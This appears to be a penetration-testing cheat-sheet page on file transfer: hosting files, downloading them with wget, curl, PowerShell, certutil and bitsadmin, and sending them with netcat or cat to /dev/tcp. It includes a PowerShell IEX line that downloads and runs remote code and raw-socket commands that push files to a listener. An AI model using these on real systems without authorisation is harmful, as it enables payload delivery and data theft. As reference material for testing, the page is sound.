# File transfer: Overview

## Host files

### SimpleHTTPServer

Start http server (default port is 8000, default path is current dir)
```bash
python -m http.server <port> -d <path>
```

### Apache

Start apache
```bash
sudo systemctl start apache2
```
Default directory `/var/www/html`

### SMB (impacket)

```bash
smbserver.py -smb2support <share-name> <local-folder>
```

### FTP

* [Pure-FTPd](03-pure-ftpd.md)
* [TFTP](04-tftp.md)

## Download files

### wget

```bash
wget <ip>:<port>/file.txt
```
See also [Wget](02-wget.md)

### curl

```bash
curl -O http://host/file.txt
```

### PowerShell

```bash
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://www.xyz.net/file.txt', 'C:\tmp\file.txt')"
```

```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<host>/<file>')"
```

### certutil

```bash
certutil.exe -urlcache -split -f http://<host>/<file> <file>
```

### VBScript

See [VBScript: Wget clone](05-vbscript-wget-clone.md)

### BITSAdmin

```bash
bitsadmin /transfer mydownloadjob /download /priority normal <url> <destination>
```

## Send/retrieve files

### netcat

```bash
nc -nlvp <port> > file
```

```bash
nc -nv <own-ip> <port> < file
```
Note: There is no feedback about the progress, or when/if the upload finished.

### cat

```bash
cat <file> > /dev/tcp/<ip>/<port>
```

```bash
nc -lvnp <port> > <file>
```
